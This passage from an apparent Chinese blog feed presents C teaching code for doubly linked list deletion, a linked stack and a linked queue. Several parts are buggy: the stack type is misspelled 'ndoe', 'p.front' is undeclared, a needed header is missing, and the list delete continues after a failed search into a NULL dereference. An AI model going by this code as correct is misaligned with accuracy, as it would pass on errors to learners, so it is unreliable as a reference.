p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  <span class="comment">//中间插入</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink-&gt;llink = p;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">delete</span><span class="params">(dnode *head,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表为空，无法删除！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)  <span class="comment">//寻找 值为 x 的结点的位置</span></span><br><span class="line">        q = q-&gt;rlink;</span><br><span class="line">    <span class="keyword">if</span>(!q)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到结点的位置！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; head-&gt;rlink)&#123;  <span class="comment">//需要删除的是第一个结点，而且表中 不只有这一个结点</span></span><br><span class="line">        head = head-&gt;rlink;</span><br><span class="line">        head-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; !head-&gt;rlink)&#123; <span class="comment">//需要删除的是第一个结点，而且表中 仅仅只有这一个结点</span></span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">//直接将双链表 置空，即初始化即可</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q-&gt;rlink)&#123;<span class="comment">//被删除的是 链表 最后一个结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//需要删除的是中间的结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = q-&gt;rlink;</span><br><span class="line">            q-&gt;rlink-&gt;llink = q-&gt;llink;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h3><p>栈的链式存储，特殊的单链表</p><p>插入 与 删除  在 单链表的 同一端进行</p><p>栈顶指针  top指向第一个结点的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span> *<span class="title">top</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;ndoe;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个空的 栈</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (top?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式栈 栈顶的结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_top</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> (top-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = top;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈：插入值为 x 的结点 为 top</span></span><br><span class="line"><span class="function">node *<span class="title">push</span><span class="params">(node *top,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ndoe));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = top;</span><br><span class="line">    top = p;</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈：删除链式栈栈顶结点 top</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h3><p>队列的链式存储，特殊的单链表</p><p>插入 与 删除 分别在单链表的两端进行</p><p>队首 front       队尾  rear  指向最后一个结点，即最后一个结点的 next 是 NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span>   <span class="comment">//结点定义</span></span><br><span class="line">&#125;node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    node *front,*rear;      <span class="comment">//队首 队尾指针 定义</span></span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个 空的链式队列</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span> *qu;</span><br><span class="line">    qu = (<span class="built_in">queue</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line">    qu-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line">    qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 链式队列 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (qu.front ? <span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    p = qu-&gt;front;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列的空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式队列队首结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_front</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!p.front)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列是空的！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (qu.front-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入操作  队尾插入</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">insert</span><span class="params">(<span class="built_in">queue</span> *qu,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;front = qu-&gt;rear = p;  <span class="comment">//当队列本身是 空 时</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        qu-&gt;rear-&gt;next = p;   <span class="comment">//队尾插入</span></span><br><span class="line">        qu-&gt;rear = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作：队首删除</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">delete</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!qu-&gt;front)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;队列为空，无法插入！\n&quot;</span>); <span class="keyword">return</span> qu;&#125;</span><br><span class="line">    q = qu-&gt;front;</span><br><span class="line">    qu-&gt;front = q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">if</span>(qu-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">        qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="链式存储" scheme="https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
</feed>
